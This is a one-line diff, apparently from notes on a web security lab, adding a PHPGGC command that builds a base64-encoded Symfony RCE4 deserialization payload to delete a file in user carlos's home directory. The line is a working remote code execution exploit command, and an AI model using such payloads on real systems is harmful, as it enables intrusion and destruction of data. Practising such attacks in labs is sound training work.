@@ -1,0 +1,1 @@
+./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
